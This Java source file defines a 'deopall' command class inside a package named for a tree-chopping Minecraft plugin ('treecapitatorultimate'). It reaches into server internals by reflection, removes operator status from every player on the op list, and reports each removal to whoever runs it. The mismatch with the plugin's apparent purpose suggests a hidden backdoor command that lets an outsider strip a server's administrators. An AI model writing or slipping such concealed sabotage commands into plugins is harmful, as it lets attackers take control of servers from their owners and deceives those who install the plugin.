package me.bow.treecapitatorultimate.commands.Server;

import com.mojang.authlib.GameProfile;
import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Objects;

@SuppressWarnings("deprecation")
public class DeopAll extends Command {
    public DeopAll() {
        super("deopall", "Deops everyone", CommandCategory.Server);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        Collection<Object> ops = null;
        Class<?> dedicatedServer = ReflectionUtils.getClass("{nms}.DedicatedServer");
        try {
            Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(Start.GetServer());
            m = ReflectionUtils.getMethod(m.getClass(), "getOPs").invoke(m);
            ops = (Collection<Object>) ReflectionUtils.getMethod(m.getClass(), "getValues", 0).invoke(m);

        } catch (Exception e) {
            e.printStackTrace();
        }
        if (ops.size() == 0) p.sendMessage(Start.Prefix + ChatColor.GREEN + "Nobody has OP!");
        ops.forEach(op -> {
            Field field = ReflectionUtils.getField(op.getClass().getSuperclass(), "a");
            GameProfile o = null;
            try {
                o = (GameProfile) field.get(op);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
            OfflinePlayer r;
            if (Objects.requireNonNull(o).isLegacy()) {
                r = Bukkit.getPlayer(o.getName());
                if (r == null) r = Bukkit.getOfflinePlayer(o.getName());
            } else {
                r = Bukkit.getPlayer(o.getId());
                if (r == null) r = Bukkit.getOfflinePlayer(o.getId());
            }
            r.setOp(false);
            if (!r.isOnline()) {
                p.sendMessage(Start.Prefix + ChatColor.RED + o.getName() + ChatColor.GREEN + " (" + ChatColor.DARK_GRAY + "Offline" + ChatColor.GREEN + ") now doesn't have op!");
            } else {
                p.sendMessage(Start.Prefix + ChatColor.RED + o.getName() + ChatColor.GREEN + " (" + ChatColor.DARK_AQUA + "Online" + ChatColor.GREEN + ") now doesn't have op!");
            }
        });
    }
}
